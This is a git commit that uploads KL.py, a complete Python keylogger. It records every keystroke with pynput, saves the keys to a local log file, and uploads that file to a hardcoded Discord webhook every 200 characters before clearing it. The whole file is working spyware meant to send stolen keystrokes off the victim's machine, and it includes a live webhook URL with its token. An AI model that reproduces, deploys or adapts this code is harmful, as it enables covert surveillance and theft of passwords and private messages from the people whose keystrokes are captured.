b09f5d23c093446d413fe8f1413ebd11c80b782e
JoseGGonzales <166436580+JoseGGonzales@users.noreply.github.com>
2025-03-31 22:40:06 -0500

    Add files via upload

---
+++ KL.py
@@ -0,0 +1,45 @@
+import pynput.keyboard
+import requests
+import os
+
+# Discord webhook URL
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1356287907131949066/GG3i6pUf-Cn8LkJnX1XdtJZ-wZ9s3kJsyETqEarKA9fpv_yH8g0qCMc8UBPkPX3vFxm1'
+
+logger = [] 
+
+# Create txt file and send to discord bot
+def append_to_log(key_stroke):
+    global logger
+    logger.append(key_stroke)  
+    with open("log.txt", "a+", encoding="utf-8") as file:
+        file.write(key_stroke) # +"\n" next to key_stroke to have every key to a new line
+    
+    # Every 200 characters will be sent to discord
+    if len("".join(logger)) >= 200:  
+        send_to_discord()
+        logger = []  
+
+# Get the keystrokes
+def evaluate_keys(key):
+    try:
+        pressed_k = key.char if key.char else "" 
+    except AttributeError:
+        #special key
+        pressed_k = " " if key == pynput.keyboard.Key.space else f" [{key}] "
+
+    append_to_log(pressed_k)
+
+# Send the txt file to bot once it reaches 200 characters
+def send_to_discord():
+    if os.path.exists('log.txt'):
+        with open('log.txt', "rb") as file:
+            response = requests.post(WEBHOOK_URL, files={"file": file})  # Send the file to Discord
+        if response.status_code == 200:
+            open("log.txt", "w").close()  # Clear log after sending
+
+# Start the keylogger
+def start():
+    with pynput.keyboard.Listener(on_press=evaluate_keys) as listener:
+        listener.join() 
+
+start()  
